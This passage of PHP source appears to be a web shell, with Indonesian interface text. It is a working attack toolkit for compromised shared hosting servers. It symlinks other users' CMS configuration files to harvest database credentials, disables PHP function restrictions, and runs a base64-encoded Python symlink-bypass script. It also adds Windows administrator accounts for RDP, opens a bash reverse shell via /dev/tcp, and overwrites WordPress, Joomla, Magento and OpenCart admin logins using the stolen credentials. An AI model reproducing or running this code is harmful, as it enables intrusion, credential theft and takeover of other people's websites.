    echo "</div>";

    }elseif($_GET['do'] == 'whm'){
    echo '<font style="text-align:center"><font color= size=2 face="Courier">
    <form method=post>
    <input type=submit style="color: lime; background-color: #22222; font-family: Courier; font-size: 15px;" name=ini value="Generate PHP.ini" /></form>';

    if(isset($_POST['ini']))
    {

    $r=fopen('php.ini','w');
    $rr=" disable_functions=none ";
    fwrite($r,$rr);
    $link=" <a href=php.ini><font color=lime size=2px face='Courier'> Click Here Cok! </font></a>";
    echo $link;
    }

    echo '<form method=post>
    <input type=submit name="usre" style="background-color: #22222; font-family: Courier; color: lime;" value="Grab User" /></form>';

    if(isset($_POST['usre'])){
    echo '<form method=post>
    <textarea rows=20 cols=40 style="background-color: #22222; font-family: Courier; color: #lime;"name=user>';$users=file("/etc/passwd");
    foreach($users as $user)
    {
    $str=explode(":",$user);
    echo $str[0]."n";
    }
    echo'</textarea><br><br>
    <input type=submit style="background-color: #22222; color: lime;" name=su value="Gass Cok!" /></form>'; }

    echo "<font color=white size=2 face='Courier'>";
    if(isset($_POST['su']))
    {

    $dir=mkdir('peler_whm',0777);
    $r = " Options all n DirectoryIndex 7atim.html n Require None n Satisfy Any";
    $f = fopen('ngentot/.htaccess','w');

    fwrite($f,$r);
    $consym="<a href=peler_whm/><font color=lime sans ms'>configuration files</font></a>";
    echo "<br>folder where config files has been symlinked<br><br><font color=white size=2 face='comic sans ms'>$consym</font>";
    echo "<br>";

    $usr=explode("n",$_POST['user']);

    foreach($usr as $uss )
    {
    $us=trim($uss);

    $r="Peler/";
    symlink('/home/'.$us.'/public_html/wp-config.php',$r.$us.'..wp-config');
    symlink('/home/'.$us.'/public_html/wordpress/wp-config.php',$r.$us.'..word-wp');
    symlink('/home/'.$us.'/public_html/blog/wp-config.php',$r.$us.'..wpblog');
    symlink('/home/'.$us.'/public_html/configuration.php',$r.$us.'..joomla-or-whmcs');
    symlink('/home/'.$us.'/public_html/joomla/configuration.php',$r.$us.'..joomla');
    symlink('/home/'.$us.'/public_html/vb/includes/config.php',$r.$us.'..vbinc');
    symlink('/home/'.$us.'/public_html/includes/config.php',$r.$us.'..vb');
    symlink('/home/'.$us.'/public_html/conf_global.php',$r.$us.'..conf_global');
    symlink('/home/'.$us.'/public_html/inc/config.php',$r.$us.'..inc');
    symlink('/home/'.$us.'/public_html/config.php',$r.$us.'..config');
    symlink('/home/'.$us.'/public_html/Settings.php',$r.$us.'..Settings');
    symlink('/home/'.$us.'/public_html/sites/default/settings.php',$r.$us.'..sites');
    symlink('/home/'.$us.'/public_html/whm/configuration.php',$r.$us.'..whm');
    symlink('/home/'.$us.'/public_html/whmcs/configuration.php',$r.$us.'..whmcs');
    symlink('/home/'.$us.'/public_html/support/configuration.php',$r.$us.'..supporwhmcs');
    symlink('/home/'.$us.'/public_html/whmc/WHM/configuration.php',$r.$us.'..WHM');
    symlink('/home/'.$us.'/public_html/whm/WHMCS/configuration.php',$r.$us.'..whmc');
    symlink('/home/'.$us.'/public_html/whm/whmcs/configuration.php',$r.$us.'..WHMcs');
    symlink('/home/'.$us.'/public_html/support/configuration.php',$r.$us.'..whmcsupp');
    symlink('/home/'.$us.'/public_html/clients/configuration.php',$r.$us.'..whmcs-cli');
    symlink('/home/'.$us.'/public_html/client/configuration.php',$r.$us.'..whmcs-cl');
    symlink('/home/'.$us.'/public_html/clientes/configuration.php',$r.$us.'..whmcs-CL');
    symlink('/home/'.$us.'/public_html/cliente/configuration.php',$r.$us.'..whmcs-Cl');
    symlink('/home/'.$us.'/public_html/clientsupport/configuration.php',$r.$us.'..whmcs-csup');
    symlink('/home/'.$us.'/public_html/billing/configuration.php',$r.$us.'..whmcs-bill');
    symlink('/home/'.$us.'/public_html/admin/config.php',$r.$us.'..admin-conf');
    symlink('/home1/'.$us.'/public_html/wp-config.php',$r.$us.'..wp-config');
    symlink('/home1/'.$us.'/public_html/wordpress/wp-config.php',$r.$us.'..word-wp');
    symlink('/home1/'.$us.'/public_html/blog/wp-config.php',$r.$us.'..wpblog');
    symlink('/home1/'.$us.'/public_html/configuration.php',$r.$us.'..joomla-or-whmcs');
    symlink('/home1/'.$us.'/public_html/joomla/configuration.php',$r.$us.'..joomla');
    symlink('/home1/'.$us.'/public_html/vb/includes/config.php',$r.$us.'..vbinc');
    symlink('/home1/'.$us.'/public_html/includes/config.php',$r.$us.'..vb');
    symlink('/home1/'.$us.'/public_html/conf_global.php',$r.$us.'..conf_global');
    symlink('/home1/'.$us.'/public_html/inc/config.php',$r.$us.'..inc');
    symlink('/home1/'.$us.'/public_html/config.php',$r.$us.'..config');
    symlink('/home1/'.$us.'/public_html/Settings.php',$r.$us.'..Settings');
    symlink('/home1/'.$us.'/public_html/sites/default/settings.php',$r.$us.'..sites');
    symlink('/home1/'.$us.'/public_html/whm/configuration.php',$r.$us.'..whm');
    symlink('/home1/'.$us.'/public_html/whmcs/configuration.php',$r.$us.'..whmcs');
    symlink('/home1/'.$us.'/public_html/support/configuration.php',$r.$us.'..supporwhmcs');
    symlink('/home1/'.$us.'/public_html/whmc/WHM/configuration.php',$r.$us.'..WHM');
    symlink('/home1/'.$us.'/public_html/whm/WHMCS/configuration.php',$r.$us.'..whmc');
    symlink('/home1/'.$us.'/public_html/whm/whmcs/configuration.php',$r.$us.'..WHMcs');
    symlink('/home1/'.$us.'/public_html/support/configuration.php',$r.$us.'..whmcsupp');
    symlink('/home1/'.$us.'/public_html/clients/configuration.php',$r.$us.'..whmcs-cli');
    symlink('/home1/'.$us.'/public_html/client/configuration.php',$r.$us.'..whmcs-cl');
    symlink('/home1/'.$us.'/public_html/clientes/configuration.php',$r.$us.'..whmcs-CL');
    symlink('/home1/'.$us.'/public_html/cliente/configuration.php',$r.$us.'..whmcs-Cl');
    symlink('/home1/'.$us.'/public_html/clientsupport/configuration.php',$r.$us.'..whmcs-csup');
    symlink('/home1/'.$us.'/public_html/billing/configuration.php',$r.$us.'..whmcs-bill');
    symlink('/home1/'.$us.'/public_html/admin/config.php',$r.$us.'..admin-conf');
    symlink('/home2/'.$us.'/public_html/wp-config.php',$r.$us.'..wp-config');
    symlink('/home2/'.$us.'/public_html/wordpress/wp-config.php',$r.$us.'..word-wp');
    symlink('/home2/'.$us.'/public_html/blog/wp-config.php',$r.$us.'..wpblog');
    symlink('/home2/'.$us.'/public_html/configuration.php',$r.$us.'..joomla-or-whmcs');
    symlink('/home2/'.$us.'/public_html/joomla/configuration.php',$r.$us.'..joomla');
    symlink('/home2/'.$us.'/public_html/vb/includes/config.php',$r.$us.'..vbinc');
    symlink('/home2/'.$us.'/public_html/includes/config.php',$r.$us.'..vb');
    symlink('/home2/'.$us.'/public_html/conf_global.php',$r.$us.'..conf_global');
    symlink('/home2/'.$us.'/public_html/inc/config.php',$r.$us.'..inc');
    symlink('/home2/'.$us.'/public_html/config.php',$r.$us.'..config');
    symlink('/home2/'.$us.'/public_html/Settings.php',$r.$us.'..Settings');
    symlink('/home2/'.$us.'/public_html/sites/default/settings.php',$r.$us.'..sites');
    symlink('/home2/'.$us.'/public_html/whm/configuration.php',$r.$us.'..whm');
    symlink('/home2/'.$us.'/public_html/whmcs/configuration.php',$r.$us.'..whmcs');
    symlink('/home2/'.$us.'/public_html/support/configuration.php',$r.$us.'..supporwhmcs');
    symlink('/home2/'.$us.'/public_html/whmc/WHM/configuration.php',$r.$us.'..WHM');
    symlink('/home2/'.$us.'/public_html/whm/WHMCS/configuration.php',$r.$us.'..whmc');
    symlink('/home2/'.$us.'/public_html/whm/whmcs/configuration.php',$r.$us.'..WHMcs');
    symlink('/home2/'.$us.'/public_html/support/configuration.php',$r.$us.'..whmcsupp');
    symlink('/home2/'.$us.'/public_html/clients/configuration.php',$r.$us.'..whmcs-cli');
    symlink('/home2/'.$us.'/public_html/client/configuration.php',$r.$us.'..whmcs-cl');
    symlink('/home2/'.$us.'/public_html/clientes/configuration.php',$r.$us.'..whmcs-CL');
    symlink('/home2/'.$us.'/public_html/cliente/configuration.php',$r.$us.'..whmcs-Cl');
    symlink('/home2/'.$us.'/public_html/clientsupport/configuration.php',$r.$us.'..whmcs-csup');
    symlink('/home2/'.$us.'/public_html/billing/configuration.php',$r.$us.'..whmcs-bill');
    symlink('/home2/'.$us.'/public_html/admin/config.php',$r.$us.'..admin-conf');
    symlink('/home3/'.$us.'/public_html/wp-config.php',$r.$us.'..wp-config');
    symlink('/home3/'.$us.'/public_html/wordpress/wp-config.php',$r.$us.'..word-wp');
    symlink('/home3/'.$us.'/public_html/blog/wp-config.php',$r.$us.'..wpblog');
    symlink('/home3/'.$us.'/public_html/configuration.php',$r.$us.'..joomla-or-whmcs');
    symlink('/home3/'.$us.'/public_html/joomla/configuration.php',$r.$us.'..joomla');
    symlink('/home3/'.$us.'/public_html/vb/includes/config.php',$r.$us.'..vbinc');
    symlink('/home3/'.$us.'/public_html/includes/config.php',$r.$us.'..vb');
    symlink('/home3/'.$us.'/public_html/conf_global.php',$r.$us.'..conf_global');
    symlink('/home3/'.$us.'/public_html/inc/config.php',$r.$us.'..inc');
    symlink('/home3/'.$us.'/public_html/config.php',$r.$us.'..config');
    symlink('/home3/'.$us.'/public_html/Settings.php',$r.$us.'..Settings');
    symlink('/home3/'.$us.'/public_html/sites/default/settings.php',$r.$us.'..sites');
    symlink('/home3/'.$us.'/public_html/whm/configuration.php',$r.$us.'..whm');
    symlink('/home3/'.$us.'/public_html/whmcs/configuration.php',$r.$us.'..whmcs');
    symlink('/home3/'.$us.'/public_html/support/configuration.php',$r.$us.'..supporwhmcs');
    symlink('/home3/'.$us.'/public_html/whmc/WHM/configuration.php',$r.$us.'..WHM');
    symlink('/home3/'.$us.'/public_html/whm/WHMCS/configuration.php',$r.$us.'..whmc');
    symlink('/home3/'.$us.'/public_html/whm/whmcs/configuration.php',$r.$us.'..WHMcs');
    symlink('/home3/'.$us.'/public_html/support/configuration.php',$r.$us.'..whmcsupp');
    symlink('/home3/'.$us.'/public_html/clients/configuration.php',$r.$us.'..whmcs-cli');
    symlink('/home3/'.$us.'/public_html/client/configuration.php',$r.$us.'..whmcs-cl');
    symlink('/home3/'.$us.'/public_html/clientes/configuration.php',$r.$us.'..whmcs-CL');
    symlink('/home3/'.$us.'/public_html/cliente/configuration.php',$r.$us.'..whmcs-Cl');
    symlink('/home3/'.$us.'/public_html/clientsupport/configuration.php',$r.$us.'..whmcs-csup');
    symlink('/home3/'.$us.'/public_html/billing/configuration.php',$r.$us.'..whmcs-bill');
    symlink('/home3/'.$us.'/public_html/admin/config.php',$r.$us.'..admin-conf');
    symlink('/home4/'.$us.'/public_html/wp-config.php',$r.$us.'..wp-config');
    symlink('/home4/'.$us.'/public_html/wordpress/wp-config.php',$r.$us.'..word-wp');
    symlink('/home4/'.$us.'/public_html/blog/wp-config.php',$r.$us.'..wpblog');
    symlink('/home4/'.$us.'/public_html/configuration.php',$r.$us.'..joomla-or-whmcs');
    symlink('/home4/'.$us.'/public_html/joomla/configuration.php',$r.$us.'..joomla');
    symlink('/home4/'.$us.'/public_html/vb/includes/config.php',$r.$us.'..vbinc');
    symlink('/home4/'.$us.'/public_html/includes/config.php',$r.$us.'..vb');
    symlink('/home4/'.$us.'/public_html/conf_global.php',$r.$us.'..conf_global');
    symlink('/home4/'.$us.'/public_html/inc/config.php',$r.$us.'..inc');
    symlink('/home4/'.$us.'/public_html/config.php',$r.$us.'..config');
    symlink('/home4/'.$us.'/public_html/Settings.php',$r.$us.'..Settings');
    symlink('/home4/'.$us.'/public_html/sites/default/settings.php',$r.$us.'..sites');
    symlink('/home4/'.$us.'/public_html/whm/configuration.php',$r.$us.'..whm');
    symlink('/home4/'.$us.'/public_html/whmcs/configuration.php',$r.$us.'..whmcs');
    symlink('/home4/'.$us.'/public_html/support/configuration.php',$r.$us.'..supporwhmcs');
    symlink('/home4/'.$us.'/public_html/whmc/WHM/configuration.php',$r.$us.'..WHM');
    symlink('/home4/'.$us.'/public_html/whm/WHMCS/configuration.php',$r.$us.'..whmc');
    symlink('/home4/'.$us.'/public_html/whm/whmcs/configuration.php',$r.$us.'..WHMcs');
    symlink('/home4/'.$us.'/public_html/support/configuration.php',$r.$us.'..whmcsupp');
    symlink('/home4/'.$us.'/public_html/clients/configuration.php',$r.$us.'..whmcs-cli');
    symlink('/home4/'.$us.'/public_html/client/configuration.php',$r.$us.'..whmcs-cl');
    symlink('/home4/'.$us.'/public_html/clientes/configuration.php',$r.$us.'..whmcs-CL');
    symlink('/home4/'.$us.'/public_html/cliente/configuration.php',$r.$us.'..whmcs-Cl');
    symlink('/home4/'.$us.'/public_html/clientsupport/configuration.php',$r.$us.'..whmcs-csup');
    symlink('/home4/'.$us.'/public_html/billing/configuration.php',$r.$us.'..whmcs-bill');
    symlink('/home4/'.$us.'/public_html/admin/config.php',$r.$us.'..admin-conf');
    symlink('/home5/'.$us.'/public_html/wp-config.php',$r.$us.'..wp-config');
    symlink('/home5/'.$us.'/public_html/wordpress/wp-config.php',$r.$us.'..word-wp');
    symlink('/home5/'.$us.'/public_html/blog/wp-config.php',$r.$us.'..wpblog');
    symlink('/home5/'.$us.'/public_html/configuration.php',$r.$us.'..joomla-or-whmcs');
    symlink('/home5/'.$us.'/public_html/joomla/configuration.php',$r.$us.'..joomla');
    symlink('/home5/'.$us.'/public_html/vb/includes/config.php',$r.$us.'..vbinc');
    symlink('/home5/'.$us.'/public_html/includes/config.php',$r.$us.'..vb');
    symlink('/home5/'.$us.'/public_html/conf_global.php',$r.$us.'..conf_global');
    symlink('/home5/'.$us.'/public_html/inc/config.php',$r.$us.'..inc');
    symlink('/home5/'.$us.'/public_html/config.php',$r.$us.'..config');
    symlink('/home5/'.$us.'/public_html/Settings.php',$r.$us.'..Settings');
    symlink('/home5/'.$us.'/public_html/sites/default/settings.php',$r.$us.'..sites');
    symlink('/home5/'.$us.'/public_html/whm/configuration.php',$r.$us.'..whm');
    symlink('/home5/'.$us.'/public_html/whmcs/configuration.php',$r.$us.'..whmcs');
    symlink('/home5/'.$us.'/public_html/support/configuration.php',$r.$us.'..supporwhmcs');
    symlink('/home5/'.$us.'/public_html/whmc/WHM/configuration.php',$r.$us.'..WHM');
    symlink('/home5/'.$us.'/public_html/whm/WHMCS/configuration.php',$r.$us.'..whmc');
    symlink('/home5/'.$us.'/public_html/whm/whmcs/configuration.php',$r.$us.'..WHMcs');
    symlink('/home5/'.$us.'/public_html/support/configuration.php',$r.$us.'..whmcsupp');
    symlink('/home5/'.$us.'/public_html/clients/configuration.php',$r.$us.'..whmcs-cli');
    symlink('/home5/'.$us.'/public_html/client/configuration.php',$r.$us.'..whmcs-cl');
    symlink('/home5/'.$us.'/public_html/clientes/configuration.php',$r.$us.'..whmcs-CL');
    symlink('/home5/'.$us.'/public_html/cliente/configuration.php',$r.$us.'..whmcs-Cl');
    symlink('/home5/'.$us.'/public_html/clientsupport/configuration.php',$r.$us.'..whmcs-csup');
    symlink('/home5/'.$us.'/public_html/billing/configuration.php',$r.$us.'..whmcs-bill');
    symlink('/home5/'.$us.'/public_html/admin/config.php',$r.$us.'..admin-conf');
    }
    }
    }elseif($_GET['do'] == 'python') {
        $sym_dir = mkdir('tatsumi_sympy', 0755);
            chdir('tatsumi_sympy');
        $file_sym = "sym.py";
        $sym_script = "Iy8qUHl0aG9uDQoNCmltcG9ydCB0aW1lDQppbXBvcnQgb3MNCmltcG9ydCBzeXMNCmltcG9ydCByZQ0KDQpvcy5zeXN0ZW0oImNvbG9yIEMiKQ0KDQpodGEgPSAiXG5GaWxlIDogLmh0YWNjZXNzIC8vIENyZWF0ZWQgU3VjY2Vzc2Z1bGx5IVxuIg0KZiA9ICJBbGwgUHJvY2Vzc2VzIERvbmUhXG5TeW1saW5rIEJ5cGFzc2VkIFN1Y2Nlc3NmdWxseSFcbiINCnByaW50ICJcbiINCnByaW50ICJ+Iio2MA0KcHJpbnQgIlN5bWxpbmsgQnlwYXNzIDIwMTQgYnkgTWluZGxlc3MgSW5qZWN0b3IgIg0KcHJpbnQgIiAgICAgICAgICAgICAgU3BlY2lhbCBHcmVldHogdG8gOiBQYWsgQ3liZXIgU2t1bGx6Ig0KcHJpbnQgIn4iKjYwDQoNCm9zLm1ha2VkaXJzKCdicnVkdWxzeW1weScpDQpvcy5jaGRpcignYnJ1ZHVsc3ltcHknKQ0KDQpzdXNyPVtdDQpzaXRleD1bXQ0Kb3Muc3lzdGVtKCJsbiAtcyAvIGJydWR1bC50eHQiKQ0KDQpoID0gIk9wdGlvbnMgSW5kZXhlcyBGb2xsb3dTeW1MaW5rc1xuRGlyZWN0b3J5SW5kZXggYnJ1ZHVsLnBodG1sXG5BZGRUeXBlIHR4dCAucGhwXG5BZGRIYW5kbGVyIHR4dCAucGhwIg0KbSA9IG9wZW4oIi5odGFjY2VzcyIsIncrIikNCm0ud3JpdGUoaCkNCm0uY2xvc2UoKQ0KcHJpbnQgaHRhDQoNCnNmID0gIjxodG1sPjx0aXRsZT5TeW1saW5rIFB5dGhvbjwvdGl0bGU+PGNlbnRlcj48Zm9udCBjb2xvcj13aGl0ZSBzaXplPTU+U3ltbGluayBCeXBhc3MgMjAxNzxicj48Zm9udCBzaXplPTQ+TWFkZSBCeSBNaW5kbGVzcyBJbmplY3RvciA8YnI+UmVjb2RlZCBCeSBDb243ZXh0PC9mb250PjwvZm9udD48YnI+PGZvbnQgY29sb3I9d2hpdGUgc2l6ZT0zPjx0YWJsZT4iDQoNCm8gPSBvcGVuKCcvZXRjL3Bhc3N3ZCcsJ3InKQ0Kbz1vLnJlYWQoKQ0KbyA9IHJlLmZpbmRhbGwoJy9ob21lL1x3KycsbykNCg0KZm9yIHh1c3IgaW4gbzoNCgl4dXNyPXh1c3IucmVwbGFjZSgnL2hvbWUvJywnJykNCglzdXNyLmFwcGVuZCh4dXNyKQ0KcHJpbnQgIi0iKjMwDQp4c2l0ZSA9IG9zLmxpc3RkaXIoIi92YXIvbmFtZWQiKQ0KDQpmb3IgeHhzaXRlIGluIHhzaXRlOg0KCXh4c2l0ZT14eHNpdGUucmVwbGFjZSgiLmRiIiwiIikNCglzaXRleC5hcHBlbmQoeHhzaXRlKQ0KcHJpbnQgZg0KcGF0aD1vcy5nZXRjd2QoKQ0KaWYgIi9wdWJsaWNfaHRtbC8iIGluIHBhdGg6DQoJcGF0aD0iL3B1YmxpY19odG1sLyINCmVsc2U6DQoJcGF0aCA9ICIvaHRtbC8iDQpjb3VudGVyPTENCmlwcz1vcGVuKCJicnVkdWwucGh0bWwiLCJ3IikNCmlwcy53cml0ZShzZikNCg0KZm9yIGZ1c3IgaW4gc3VzcjoNCglmb3IgZnNpdGUgaW4gc2l0ZXg6DQoJCWZ1PWZ1c3JbMDo1XQ0KCQlzPWZzaXRlWzA6NV0NCgkJaWYgZnU9PXM6DQoJCQlpcHMud3JpdGUoIjxib2R5IGJnY29sb3I9YmxhY2s+PHRyPjx0ZCBzdHlsZT1mb250LWZhbWlseTpjYWxpYnJpO2ZvbnQtd2VpZ2h0OmJvbGQ7Y29sb3I6d2hpdGU7PiVzPC90ZD48dGQgc3R5bGU9Zm9udC1mYW1pbHk6Y2FsaWJyaTtmb250LXdlaWdodDpib2xkO2NvbG9yOnJlZDs+JXM8L3RkPjx0ZCBzdHlsZT1mb250LWZhbWlseTpjYWxpYnJpO2ZvbnQtd2VpZ2h0OmJvbGQ7PjxhIGhyZWY9YnJ1ZHVsLnR4dC9ob21lLyVzJXMgdGFyZ2V0PV9ibGFuayA+JXM8L2E+PC90ZD4iJShjb3VudGVyLGZ1c3IsZnVzcixwYXRoLGZzaXRlKSkNCgkJCWNvdW50ZXI9Y291bnRlcisx";
            $sym = fopen($file_sym, "w");
        fwrite($sym, base64_decode($sym_script));
        chmod($file_sym, 0755);
            $tatsumi = exe("python sym.py");
        echo "<br><center>Done ... <a href='tatsumi_sympy/brudulsympy/' target='_blank'>Klik Here</a>";
        echo "<br>";
        } elseif($_GET['do'] == 'krdp_shell') {
        if(strtolower(substr(PHP_OS, 0, 3)) === 'win') {
            if($_POST['create']) {
                $user = htmlspecialchars($_POST['user']);
                $pass = htmlspecialchars($_POST['pass']);
                if(preg_match("/$user/", exe("net user"))) {
                    echo "[INFO] -> <font color=#ff0066>user <font color=cyan>$user</font> sudah ada</font>";
                } else {
                    $add_user   = exe("net user $user $pass /add");
                    $add_groups1 = exe("net localgroup Administrators $user /add");
                    $add_groups2 = exe("net localgroup Administrator $user /add");
                    $add_groups3 = exe("net localgroup Administrateur $user /add");
                    echo "[ RDP ACCOUNT INFO ]<br>
                    ------------------------------<br>
                    IP: <font color=cyan>".gethostbyname($_SERVER['HTTP_HOST'])."</font><br>
                    Username: <font color=cyan>$user</font><br>
                    Password: <font color=cyan>$pass</font><br>
                    ------------------------------<br><br>
                    [ STATUS ]<br>
                    ------------------------------<br>
                    ";
                    if($add_user) {
                        echo "[add user] -> <font color='cyan'>Berhasil</font><br>";
                    } else {
                        echo "[add user] -> <font color='#ff0066'>Gagal</font><br>";
                    }
                    if($add_groups1) {
                        echo "[add localgroup Administrators] -> <font color='cyan'>Berhasil</font><br>";
                    } elseif($add_groups2) {
                        echo "[add localgroup Administrator] -> <font color='cyan'>Berhasil</font><br>";
                    } elseif($add_groups3) {
                        echo "[add localgroup Administrateur] -> <font color='cyan'>Berhasil</font><br>";
                    } else {
                        echo "[add localgroup] -> <font color='#ff0066'>Gagal</font><br>";
                    }
                    echo "------------------------------<br>";
                }
            } elseif($_POST['s_opsi']) {
                $user = htmlspecialchars($_POST['r_user']);
                if($_POST['opsi'] == '1') {
                    $cek = exe("net user $user");
                    echo "Checking username <font color=cyan>$user</font> ....... ";
                    if(preg_match("/$user/", $cek)) {
                        echo "[ <font color=cyan>Sudah ada</font> ]<br>
                        ------------------------------<br><br>
                        <pre>$cek</pre>";
                    } else {
                        echo "[ <font color=#ff0066>belum ada</font> ]";
                    }
                } elseif($_POST['opsi'] == '2') {
                    $cek = exe("net user $user 3rr0r");
                    if(preg_match("/$user/", exe("net user"))) {
                        echo "[change password: <font color=cyan>3rr0r</font>] -> ";
                        if($cek) {
                            echo "<font color=cyan>Berhasil</font>";
                        } else {
                            echo "<font color=#ff0066>Gagal</font>";
                        }
                    } else {
                        echo "[INFO] -> <font color=#ff0066>user <font color=cyan>$user</font> belum ada</font>";
                    }
                } elseif($_POST['opsi'] == '3') {
                    $cek = exe("net user $user /DELETE");
                    if(preg_match("/$user/", exe("net user"))) {
                        echo "[remove user: <font color=cyan>$user</font>] -> ";
                        if($cek) {
                            echo "<font color=cyan>Berhasil</font>";
                        } else {
                            echo "<font color=#ff0066>Gagal</font>";
                        }
                    } else {
                        echo "[INFO] -> <font color=#ff0066>user <font color=cyan>$user</font> belum ada</font>";
                    }
                } else {
                    //
                }
            } else {
                echo "-- Create RDP --<br>
                <form method='post'>
                <input type='text' name='user' placeholder='username' value='3rr0r' requi#ff0066>
                <input type='text' name='pass' placeholder='password' value='3rr0r' requi#ff0066>
                <input type='submit' name='create' value='>>'>
                </form>
                -- Option --<br>
                <form method='post'>
                <input type='text' name='r_user' placeholder='username' requi#ff0066>
                <select name='opsi'>
                <option value='1'>Cek Username</option>
                <option value='2'>Ubah Password</option>
                <option value='3'>Hapus Username</option>
                </select>
                <input type='submit' name='s_opsi' value='>>'>
                </form>
                ";
            }
        } else {
            echo "<font color=#cyan>Fitur ini hanya dapat digunakan dalam Windows Server.</font>";
            echo "<br>";
        }
    } elseif($_GET['do'] == 'network') {
      echo "<center><form method='post'>
      Back Connect: <br>
      <input type='text' placeholder='ip' name='ip_bc' value='".$_SERVER['REMOTE_ADDR']."'><br>
      <input type='text' placeholder='port' name='port_bc' value='1337'><br>
      <input type='submit' name='sub_bc' value='Reverse' style='width: 210px;'>
      </form>";
      if(isset($_POST['sub_bc'])) {
        $ip = $_POST['ip_bc'];
        $port = $_POST['port_bc'];
        exe("/bin/bash -i >& /dev/tcp/$ip/$port 0>&1");
      }
      echo "</center>";
        } elseif($_GET['do'] == 'auto_edit_user') {
      if($_POST['hajar']) {
        if(strlen($_POST['pass_baru']) < 6 OR strlen($_POST['user_baru']) < 6) {
          echo "username atau password harus lebih dari 6 karakter";
        } else {
          $user_baru = $_POST['user_baru'];
          $pass_baru = md5($_POST['pass_baru']);
          $conf = $_POST['config_dir'];
          $scan_conf = scandir($conf);
          foreach($scan_conf as $file_conf) {
            if(!is_file("$conf/$file_conf")) continue;
            $config = file_get_contents("$conf/$file_conf");
            if(preg_match("/JConfig|joomla/",$config)) {
              $dbhost = ambilkata($config,"host = '","'");
              $dbuser = ambilkata($config,"user = '","'");
              $dbpass = ambilkata($config,"password = '","'");
              $dbname = ambilkata($config,"db = '","'");
              $dbprefix = ambilkata($config,"dbprefix = '","'");
              $prefix = $dbprefix."users";
              $conn = mysql_connect($dbhost,$dbuser,$dbpass);
              $db = mysql_select_db($dbname);
              $q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
              $result = mysql_fetch_array($q);
              $id = $result['id'];
              $site = ambilkata($config,"sitename = '","'");
              $update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE id='$id'");
              echo "Config => ".$file_conf."<br>";
              echo "CMS => Joomla<br>";
              if($site == '') {
                echo "Sitename => <font color=maroon>error, gabisa ambil nama domain nya</font><br>";
              } else {
                echo "Sitename => $site<br>";
              }
              if(!$update OR !$conn OR !$db) {
                echo "Status => <font color=maroon>".mysql_error()."</font><br><br>";
              } else {
                echo "Status => <font color=green>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
              }
              mysql_close($conn);
            } elseif(preg_match("/WordPress/",$config)) {
              $dbhost = ambilkata($config,"DB_HOST', '","'");
              $dbuser = ambilkata($config,"DB_USER', '","'");
              $dbpass = ambilkata($config,"DB_PASSWORD', '","'");
              $dbname = ambilkata($config,"DB_NAME', '","'");
              $dbprefix = ambilkata($config,"table_prefix  = '","'");
              $prefix = $dbprefix."users";
              $option = $dbprefix."options";
              $conn = mysql_connect($dbhost,$dbuser,$dbpass);
              $db = mysql_select_db($dbname);
              $q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
              $result = mysql_fetch_array($q);
              $id = $result[ID];
              $q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
              $result2 = mysql_fetch_array($q2);
              $target = $result2[option_value];
              if($target == '') {
                $url_target = "Login => <font color=maroon>error, gabisa ambil nama domain nyaa</font><br>";
              } else {
                $url_target = "Login => <a href='$target/wp-login.php' target='_blank'><u>$target/wp-login.php</u></a><br>";
              }
              $update = mysql_query("UPDATE $prefix SET user_login='$user_baru',user_pass='$pass_baru' WHERE id='$id'");
              echo "Config => ".$file_conf."<br>";
              echo "CMS => Wordpress<br>";
              echo $url_target;
              if(!$update OR !$conn OR !$db) {
                echo "Status => <font color=maroon>".mysql_error()."</font><br><br>";
              } else {
                echo "Status => <font color=green>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
              }
              mysql_close($conn);
            } elseif(preg_match("/Magento|Mage_Core/",$config)) {
              $dbhost = ambilkata($config,"<host><![CDATA[","]]></host>");
              $dbuser = ambilkata($config,"<username><![CDATA[","]]></username>");
              $dbpass = ambilkata($config,"<password><![CDATA[","]]></password>");
              $dbname = ambilkata($config,"<dbname><![CDATA[","]]></dbname>");
              $dbprefix = ambilkata($config,"<table_prefix><![CDATA[","]]></table_prefix>");
              $prefix = $dbprefix."admin_user";
              $option = $dbprefix."core_config_data";
              $conn = mysql_connect($dbhost,$dbuser,$dbpass);
              $db = mysql_select_db($dbname);
              $q = mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");
              $result = mysql_fetch_array($q);
              $id = $result[user_id];
              $q2 = mysql_query("SELECT * FROM $option WHERE path='web/secure/base_url'");
              $result2 = mysql_fetch_array($q2);
              $target = $result2[value];
              if($target == '') {
                $url_target = "Login => <font color=maroon>error, gabisa ambil nama domain nyaa</font><br>";
              } else {
                $url_target = "Login => <a href='$target/admin/' target='_blank'><u>$target/admin/</u></a><br>";
              }
              $update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");
              echo "Config => ".$file_conf."<br>";
              echo "CMS => Magento<br>";
              echo $url_target;
              if(!$update OR !$conn OR !$db) {
                echo "Status => <font color=maroon>".mysql_error()."</font><br><br>";
              } else {
                echo "Status => <font color=green>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
              }
              mysql_close($conn);
            } elseif(preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/",$config)) {
              $dbhost = ambilkata($config,"'DB_HOSTNAME', '","'");
              $dbuser = ambilkata($config,"'DB_USERNAME', '","'");
              $dbpass = ambilkata($config,"'DB_PASSWORD', '","'");
              $dbname = ambilkata($config,"'DB_DATABASE', '","'");
              $dbprefix = ambilkata($config,"'DB_PREFIX', '","'");
              $prefix = $dbprefix."user";
              $conn = mysql_connect($dbhost,$dbuser,$dbpass);
              $db = mysql_select_db($dbname);
              $q = mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");
              $result = mysql_fetch_array($q);
              $id = $result[user_id];
              $target = ambilkata($config,"HTTP_SERVER', '","'");
              if($target == '') {
                $url_target = "Login => <font color=maroon>error, gabisa ambil nama domain nyaa</font><br>";
              } else {
                $url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a><br>";
              }
              $update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");
              echo "Config => ".$file_conf."<br>";
              echo "CMS => OpenCart<br>";
              echo $url_target;
              if(!$update OR !$conn OR !$db) {
                echo "Status => <font color=maroon>".mysql_error()."</font><br><br>";
              } else {
                echo "Status => <font color=green>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
